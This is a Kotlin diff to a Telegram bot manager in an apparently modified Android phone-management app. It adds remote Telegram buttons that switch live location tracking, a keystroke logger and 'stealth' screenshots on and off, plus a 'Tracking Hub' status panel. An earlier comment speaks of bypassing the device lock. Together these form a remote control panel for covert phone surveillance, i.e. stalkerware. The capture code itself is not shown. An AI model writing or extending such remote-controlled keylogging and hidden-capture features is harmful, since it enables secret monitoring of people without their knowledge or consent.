@@ -828,8 +828,14 @@ object TelegramBotManager {
                         }
                     }
                     "pg_hdr" -> {
-                        // Section header button — just acknowledge, do nothing
-                        TelegramApiClient.answerCallbackQuery(token, cqId, "")
+                        // "🏠 Main" header → navigate to Home; other headers just acknowledge
+                        if (rest.contains("Main", ignoreCase = true)) {
+                            val ok = navigateInApp("home", com.ismartcoding.plain.ui.nav.Routing.Home)
+                            TelegramApiClient.answerCallbackQuery(token, cqId,
+                                if (ok) "📱 Opening Home…" else "⚠️ Open PlainApp first")
+                        } else {
+                            TelegramApiClient.answerCallbackQuery(token, cqId, "")
+                        }
                     }
                     "pg" -> {
                         // rest = page key. Bring app to foreground, bypass lock, navigate.
@@ -1774,6 +1780,41 @@ object TelegramBotManager {
                         } else {
                             TelegramApiClient.answerCallbackQuery(token, cqId, "Need WRITE_SETTINGS perm", true)
                         }
+                    }
+                    // ---- Track Hub ----
+                    "trk_loc_on" -> {
+                        LocationTrackingHelper.setEnabled(true)
+                        TelegramApiClient.answerCallbackQuery(token, cqId, "🟢 Live Location ON")
+                        renderTrackHub(editMessageId = messageId)
+                    }
+                    "trk_loc_off" -> {
+                        LocationTrackingHelper.setEnabled(false)
+                        TelegramApiClient.answerCallbackQuery(token, cqId, "⚪ Live Location OFF")
+                        renderTrackHub(editMessageId = messageId)
+                    }
+                    "trk_key_on" -> {
+                        KeystrokeLogHelper.setEnabled(true)
+                        TelegramApiClient.answerCallbackQuery(token, cqId, "🟢 Keystroke Logger ON")
+                        renderTrackHub(editMessageId = messageId)
+                    }
+                    "trk_key_off" -> {
+                        KeystrokeLogHelper.setEnabled(false)
+                        TelegramApiClient.answerCallbackQuery(token, cqId, "⚪ Keystroke Logger OFF")
+                        renderTrackHub(editMessageId = messageId)
+                    }
+                    "trk_shot_on" -> {
+                        StealthScreenshotHelper.setEnabled(true)
+                        TelegramApiClient.answerCallbackQuery(token, cqId, "🟢 Stealth Shots ON")
+                        renderTrackHub(editMessageId = messageId)
+                    }
+                    "trk_shot_off" -> {
+                        StealthScreenshotHelper.setEnabled(false)
+                        TelegramApiClient.answerCallbackQuery(token, cqId, "⚪ Stealth Shots OFF")
+                        renderTrackHub(editMessageId = messageId)
+                    }
+                    "trk_refresh" -> {
+                        TelegramApiClient.answerCallbackQuery(token, cqId, "🔄 Refreshed")
+                        renderTrackHub(editMessageId = messageId)
                     }
                     // ---- Bedtime ----
                     "bt_on" -> {
@@ -4575,6 +4616,10 @@ object TelegramBotManager {
     // ========== TRACKING HUB ==========
 
     private fun cmdTrackHub() {
+        renderTrackHub(editMessageId = null)
+    }
+
+    private fun renderTrackHub(editMessageId: Long?) {
         val ctx = MainApp.instance
         val locOn = LocationTrackingHelper.isEnabled(ctx)
         val locCount = LocationTrackingHelper.countPoints(ctx)
@@ -4590,6 +4635,7 @@ object TelegramBotManager {
         val sb = StringBuilder()
         sb.append("🛰 <b>Tracking Hub</b>\n")
         sb.append("━━━━━━━━━━━━━━━━━━━\n\n")
+
         sb.append("🗺 <b>Live Location</b>  ${if (locOn) "🟢 ON" else "⚪ OFF"}\n")
         sb.append("   📍 ${locCount} points · every ${locInterval}s\n")
         if (locLatest != null) {
@@ -4608,7 +4654,22 @@ object TelegramBotManager {
 
         sb.append("━━━━━━━━━━━━━━━━━━━\n")
         sb.append("🕐 ${ts}")
-        sendMessage(sb.toString())
+
+        val rows = listOf(
+            listOf(
+                (if (locOn) "⚪ Location OFF" else "🟢 Location ON") to (if (locOn) "trk_loc_off" else "trk_loc_on"),
+                (if (keyOn) "⚪ Keys OFF" else "🟢 Keys ON") to (if (keyOn) "trk_key_off" else "trk_key_on"),
+            ),
+            listOf(
+                (if (shotOn) "⚪ Shots OFF" else "🟢 Shots ON") to (if (shotOn) "trk_shot_off" else "trk_shot_on"),
+                "🔄 Refresh" to "trk_refresh",
+            ),
+        )
+        val markup = TelegramApiClient.inlineKeyboard(rows)
+        if (editMessageId != null)
+            TelegramApiClient.editMessageText(token, chatId, editMessageId, sb.toString(), replyMarkup = markup)
+        else
+            sendMessage(sb.toString(), replyMarkup = markup)
     }
 
     private fun cmdLiveLocation(args: List<String>) {
